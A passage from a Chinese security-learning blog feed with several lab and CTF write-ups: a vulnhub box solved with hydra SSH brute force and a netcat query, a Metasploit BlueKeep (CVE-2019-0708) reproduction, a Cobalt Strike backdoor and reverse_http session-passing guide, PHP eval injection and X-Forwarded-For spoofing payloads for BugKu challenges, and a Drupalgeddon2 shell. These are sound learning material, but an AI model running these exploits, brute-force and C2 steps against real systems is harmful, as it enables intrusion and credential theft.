src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104113348355.png" alt="image-20210104113348355"></p><p>得到目录 <code>/SuperSecretCys3c1</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104113429447.png" alt="image-20210104113429447"></p><p>下载查看是一个图片，但是打不开啊，用binwalk查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http:&#x2F;&#x2F;192.168.36.128&#x2F;SuperSecretCys3c1&#x2F;flag.bz2&quot;</span><br><span class="line">tar zxvf flag.bz2 </span><br><span class="line">cd flag</span><br><span class="line">binwalk -e flag.jpg   &#x2F;&#x2F;手动分离文件</span><br><span class="line">cd _flag.jpg.extracted</span><br><span class="line">ls</span><br><span class="line">cat flag.txt    </span><br></pre></td></tr></table></figure><blockquote><p>Z3VyIGhmcmVhbnpyIG5hcSBjbmZmamJlcSBndW5nIGxiaCBuZXIgeWJieHZhdCBzYmUgcmt2ZmdmIGJhIHF2ZSB0YTQ4M3RzaGFyZTk4dA==</p></blockquote><p>这个一看就要base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d flag.txt</span><br></pre></td></tr></table></figure><blockquote><p>gur hfreanzr naq cnffjbeq gung lbh ner ybbxvat sbe rkvfgf ba qve ta483tshare98t</p></blockquote><p>ROT13解码</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104115054643.png" alt="image-20210104115054643"></p><p>又得到一个目录 <code>/gn483gfuner98g</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104115150983.png" alt="image-20210104115150983"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104115216327.png" alt="image-20210104115216327"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104115226539.png" alt="image-20210104115226539"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd | grep bash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104115400005.png" alt="image-20210104115400005"></p><p>找到了用户名，root cysec1 cysec ,把这些写入username.txt中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http:&#x2F;&#x2F;192.168.36.128&#x2F;gn483gfuner98g&#x2F;passwordlist.txt&quot;</span><br><span class="line">hydra -L username.txt -P passwordlist.txt 192.168.36.128 ssh -V -I -e nsr -t 4 -T  2 -u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104121337283.png" alt="image-20210104121337283"></p><p>登录，看到一个包</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104134113039.png" alt="image-20210104134113039"></p><p>打开选择<code>tcp.stream eq 4 </code> 看到一个文件answer.txt</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104135704503.png" alt="image-20210104135704503"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104140757768.png" alt="image-20210104140757768"></p><p>查看本机端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tuanp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104135903522.png" alt="image-20210104135903522"></p><h3 id="nc的使用"><a href="#nc的使用" class="headerlink" title="nc的使用"></a>nc的使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h 帮助信息 </span><br><span class="line">-l 监听模式，用于入站连接 </span><br><span class="line">-n 指定数字的IP地址，不能用hostname </span><br><span class="line">-u UDP模式</span><br><span class="line">-t TCP模式（默认模式） </span><br><span class="line">-v 详细输出——用两个-v可得到更详细的内容 </span><br><span class="line">-w secs timeout的时间 </span><br><span class="line">-z 将输入输出关掉——用于扫描时 </span><br><span class="line">其中端口号可以指定一个或者用lo-hi式的指定范围。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv -u 192.168.36.128 8889</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104140724561.png" alt="image-20210104140724561"></p><p>输入刚才在wireshark中的其中一个数据，就会自动返回一行，告诉了root的密码为I*TT55@7</p><p>这是什么神仙操作，我懵了。。。。这原理是什么啊？？？</p><p>以root用户登录ssh,发现/root下有udpserver, udp_server.py</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210104142451255.png" alt="image-20210104142451255"></p><p>看了才知道，刚才是用nc默认登入到udp服务器里了，并且写了语句，只有输入固定的一串数，就能得到root用户的密码，但是真实环境绝对没有这么傻是运维会特意写给你，就只能自己个提权了。</p><p>而且这个Python文件也描述了，必须是8889端口访问的才是udp服务器。</p><blockquote><p>noob 意思是“菜鸟”</p><p>lol 意思是“233”</p><p>全程都在嘲讽我！！！！！！！！</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ksdpmx.bitbucket.io/2020/09/08/cysec-1-524/">https://ksdpmx.bitbucket.io/2020/09/08/cysec-1-524/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
            <tag> flag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】CVE-2019-0708 远程桌面代码执行</title>
      <link href="2023/11/28/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/11/28/CVE-2019-0708%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>这几天做内网项目渗透的时候发现的这个漏洞，检测出现<code>Microsoft RDP RCE（CVE-2019-0708）（BlueKeep）</code>，明显的bluekeep就好像是可以打蓝屏的感觉，为了安全起见，决定搭建靶机亲自测试。（给他弄蓝屏了，客户还不鲨了我）</p><p>受影响的系统包括winxp，win7、Windows2003，Windows2008，Windows2008R2等</p><p>（具体可以去补丁页面看）</p><p>修复补丁的下载地址</p><p><a href="https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2019-0708">https://msrc.microsoft.com/update-guide/zh-cn/vulnerability/CVE-2019-0708</a></p><h1 id="二、准备工作"><a href="#二、准备工作" class="headerlink" title="二、准备工作"></a>二、准备工作</h1><ul><li><p>kali攻击机</p></li><li><p>测试环境 Windows 7 ultimate sp1 x64</p></li></ul><p>Windows7 SP1下载链接：</p><p><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></p><p>安装的时候要选择ultimate版本</p><p>安装完成之后，要打开rdp 3389端口才行</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203153921950.png" alt="image-20201203153921950"></p><h1 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h1><h3 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h3 id="搜索exp攻击模块"><a href="#搜索exp攻击模块" class="headerlink" title="搜索exp攻击模块"></a>搜索exp攻击模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 0708</span><br></pre></td></tr></table></figure><h3 id="加载攻击模块"><a href="#加载攻击模块" class="headerlink" title="加载攻击模块"></a>加载攻击模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br></pre></td></tr></table></figure><h3 id="设置攻击参数"><a href="#设置攻击参数" class="headerlink" title="设置攻击参数"></a>设置攻击参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.101.128   # 目标ip</span><br><span class="line">set target 4 # info查看操作系统 是Windows 7 SP1 &#x2F; 2008 R2 (6.1.7601 x64 - VMWare 15)对应id 4</span><br><span class="line">show options   # 确认攻击参数</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203134811461.png" alt="image-20201203134811461"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203134418106.png" alt="image-20201203134418106"></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功进入<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203134444413.png" alt="image-20201203134444413"></p><p>可以shell,获取系统权限</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203134632035.png" alt="image-20201203134632035"></p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>至此复现就结束了，可以进入内网，在此过程中也没有出现蓝屏现象。</p><p>本来一开始搭建完成之后用goby扫不出来东西，还以为哪里又出问题了，把防火墙关闭之后，只出了永恒之蓝 MS17-010 ，没有0708，那只能手动测试了，没想到还真有，所有已知操作系统的时候，一定要把知道的cve都试一试，说不定就行了呢。</p><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><p><a href="https://cjjkkk.github.io/CVE-2019-0708/">https://cjjkkk.github.io/CVE-2019-0708/</a></p><p><a href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/113.html">http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/113.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike的使用</title>
      <link href="2023/11/28/Cobalt%20Strike%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2023/11/28/Cobalt%20Strike%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="工具简介"><a href="#工具简介" class="headerlink" title="工具简介"></a>工具简介</h2><p>Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。</p><p>还可以进行钓鱼攻击包括：网站克隆、目标信息获取、java执行、浏览器攻击等</p><p>CS主要用于团体协作，可以让多个攻击者同时连接到团体服务器，共享信息。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>CS分为客户端和服务端，其中服务端只能运行在Linux系统中，可以搭建在VPS上。</p><p>teamserver是服务端</p><p>在kali服务端中执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.1.123 123456      </span><br></pre></td></tr></table></figure><blockquote><p>ip可以是本地，也可以是远程的服务器公网地址，123456是连接密码</p></blockquote><p>客户端：</p><p>点击其中一个打开<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134041989.png" alt="image-20210201134041989"></p><p>输入hostIP（刚才设置的），端口默认50050，用户名随便取，再输入密码123456即可</p><p>登录成功后，可以看到如下界面，主要有cs基本设置、视图、攻击、报表等功能</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134219304.png" alt="image-20210201134219304"></p><h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134318718.png" alt="image-20210201134318718"></p><p>它可以不同的需求来生成木马文件：HTA木马文件、office宏病毒文件、各种语言版本的payload、USB/CD利用自动播放运行的木马文件、捆绑器、可执行Payload等</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134406013.png" alt="image-20210201134406013"></p><p>web方面：对开启的web服务进行管理、克隆网站(可记录受害者提交的数据)、提供Web以供下载某文件、提供Web服务，便于下载和执行PowerShell  Payload 、启动一个Web服务以提供自签名Java  Applet的运行环境、自动检测Java版本并利用已知的exploits绕过security、用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</p><h2 id="攻击实施"><a href="#攻击实施" class="headerlink" title="攻击实施"></a>攻击实施</h2><p>点击攻击——生成后门——Windows executable </p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134834554.png" alt="image-20210201134834554"></p><p>选择监听器，没有可以自己add</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201134858889.png" alt="image-20210201134858889"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201135044850.png" alt="image-20210201135044850"></p><blockquote><p>这里端口也可以更改，默认是80</p></blockquote><p>保持之后，选择监听器，之后勾选是否选择x64的payload</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201135212436.png" alt="image-20210201135212436"></p><p>点击生成，就会生成一个artifact.exe文件</p><p>将这个木马文件上传至靶机，点击执行，在客户端中靶机就会上线。</p><p>上线后，在进入beacon后，执行命令会很慢很慢，因为默认心跳为 <code>60s</code>，所以首先要降低心跳值</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201135426401.png" alt="image-20210201135426401"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0   # 因为是靶机，所以可以0，但是如果是真实环境，建议值大一点</span><br></pre></td></tr></table></figure><p>然后就可以内网漫游了</p><h3 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201140057854.png" alt="image-20210201140057854"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201135944272.png" alt="image-20210201135944272"></p><h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201140425137.png" alt="image-20210201140425137"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201140402543.png" alt="image-20210201140402543"></p><h3 id="图形化显示"><a href="#图形化显示" class="headerlink" title="图形化显示"></a>图形化显示</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201141541370.png" alt="image-20210201141541370"></p><h2 id="cs与msf联动"><a href="#cs与msf联动" class="headerlink" title="cs与msf联动"></a>cs与msf联动</h2><h3 id="将cs得到的session传给msf"><a href="#将cs得到的session传给msf" class="headerlink" title="将cs得到的session传给msf"></a>将cs得到的session传给msf</h3><p>1、新建一个外部的监听器<code>foreigin HTTP</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201140751084.png" alt="image-20210201140751084"></p><p>填上监听ip、端口</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201140952826.png" alt="image-20210201140952826"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201141022387.png" alt="image-20210201141022387"></p><p>2、kali连接</p><p>开启msf，使用exploit/multi/handler模块，设置payload为windows/meterpreter/reverse_http（payload必须是和cs上设置的监听模块一致）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost 192.168.233.128</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201141502744.png" alt="image-20210201141502744"></p><p>3、cs上增加会话</p><p>点击增加会话</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201142136669.png" alt="image-20210201142136669"></p><p>选择msf</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201142205934.png" alt="image-20210201142205934"></p><p>或者直接在控制台输入 <code>spawn msf</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201142405375.png" alt="image-20210201142405375"></p><blockquote><p>spawn+监听器的名字</p></blockquote><p>这样msf就获取了会话，方便提权等操作</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201142433656.png" alt="image-20210201142433656"></p><h3 id="将msf获取的session传给cs"><a href="#将msf获取的session传给cs" class="headerlink" title="将msf获取的session传给cs"></a>将msf获取的session传给cs</h3><p>1、cs开启监听器</p><p><img src="https://img-blog.csdnimg.cn/20200511001027925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTI1MTkyNw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2、msf配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost x.x.x.x               #cobaltstrike监听的ip</span><br><span class="line">set lport 6789                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="cs获取到session给另一个cs"><a href="#cs获取到session给另一个cs" class="headerlink" title="cs获取到session给另一个cs"></a>cs获取到session给另一个cs</h3><p>AB之间相互建立监听，后目标主机右键Spawn即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_39251927/article/details/106044399">https://blog.csdn.net/weixin_39251927/article/details/106044399</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu CTF之web8【文件包含】</title>
      <link href="2023/11/28/BugKu%20CTF%E4%B9%8Bweb8%E3%80%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%91/"/>
      <url>2023/11/28/BugKu%20CTF%E4%B9%8Bweb8%E3%80%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p><a href="http://114.67.246.176:12466/">http://114.67.246.176:12466/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><p>var_dump: 函数用于输出变量的相关信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数字</span></span><br><span class="line">var_dump(<span class="number">1</span>); &gt; <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 字符串</span></span><br><span class="line">var_dump(<span class="string">&quot;string&quot;</span>); &gt;  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;string&quot;</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><p><code>eval</code>是此题的突破口，能够执行php代码</p><p>闭合<code>var_dump</code>函数，利用<code>print_r</code>，<code>file()</code>函数把整个文件读入一个数组中</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(file(<span class="string">&quot;test.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[<span class="number">0</span>] =&gt; Hello World. Testing testing!</span><br><span class="line">[<span class="number">1</span>] =&gt; Another day, another line.</span><br><span class="line">[<span class="number">2</span>] =&gt; <span class="keyword">If</span> the <span class="keyword">array</span> picks up this line,</span><br><span class="line">[<span class="number">3</span>] =&gt; then is it a pickup line?</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>本题POC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://114.67.246.176:12466?hello=1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_16124275034958.png" alt="img"></p><p>eval操作为 eval(“var_dump(1);print_r(file(“./flag.php”)”)</p><p>获取到了flag</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>var_dump()</li><li>file()</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu CTF之web12【XFF伪造】</title>
      <link href="2023/11/28/BugKu%20CTF%E4%B9%8Bweb12%E3%80%90XFF%E4%BC%AA%E9%80%A0%E3%80%91/"/>
      <url>2023/11/28/BugKu%20CTF%E4%B9%8Bweb12%E3%80%90XFF%E4%BC%AA%E9%80%A0%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p> <a href="http://114.67.246.176:18149/">http://114.67.246.176:18149/</a></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210204160200938.png" alt="image-20210204160200938"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;114.67.246.176:18149&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210204160507962.png" alt="image-20210204160507962"></p><p>末尾的一串一看就是base64,解码是<code>test123</code></p><p>输入用户名和密码，却说我的IP被禁用，并且通知管理员记录下来了，说明用户十有八九是admin</p><h2 id="加X-Forwarded-For参数绕过"><a href="#加X-Forwarded-For参数绕过" class="headerlink" title="加X-Forwarded-For参数绕过"></a>加X-Forwarded-For参数绕过</h2><p><strong>X-Forwarded-For:127.0.0.1</strong></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210204160439745.png" alt="image-20210204160439745"></p><p>但是！用burp不知道为何发送不出去包，这也难不倒我</p><p>用<code>curl</code>工具添加<code>POST</code>、<code>http头</code>的参数访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://114.67.246.176:18149/ -H &quot;X-Forwarded-For:127.0.0.1&quot; -d &quot;user=admin&amp;pass=test123&quot;</span><br></pre></td></tr></table></figure><blockquote><p>-H 加HTTP头的参数</p><p>-d 意思是POST访问形式</p></blockquote><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210204160837337.png" alt="image-20210204160837337"></p><p>获取到了flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>billu:b0x_2靶机练习</title>
      <link href="2023/11/28/billu%20b0x_2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>2023/11/28/billu%20b0x_2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>arp-scan -l</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111094419577.png" alt="image-20210111094419577"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><code>namp -A 192.168.56.105</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111095150012.png" alt="image-20210111095150012"></p><p>检测到ssh是有<code>openSSH 6.6.1p1</code>服务支持，貌似可以利用，是用户枚举漏洞，只能检测有哪些用户存在，实际上也是利用自己的字典爆破，没啥大用处（参考文章：<a href="https://blog.csdn.net/JiangBuLiu/article/details/95203913">OpenSSH 用户名枚举漏洞（CVE-2018-15473）</a></p><p>80端口还能扫描到一些目录文件</p><h2 id="Drupal-8框架利用"><a href="#Drupal-8框架利用" class="headerlink" title="Drupal 8框架利用"></a>Drupal 8框架利用</h2><p>该网站使用了 “Drupal 8”框架搭建，从主页也可以发现这个服务</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111095707757.png" alt="image-20210111095707757"></p><p>用searchsploit搜索<code>Drupal 8</code></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111100902878.png" alt="image-20210111100902878"></p><p>看到关键词 <code>Drupalgeddon2</code></p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>搜索 Drupal</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111101107642.png" alt="image-20210111101107642"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.56.105</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210111101503850.png" alt="image-20210111101503850"></p><p>因为没有/bin/bash，手动添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>检测linux的自动化脚本</p><p><a 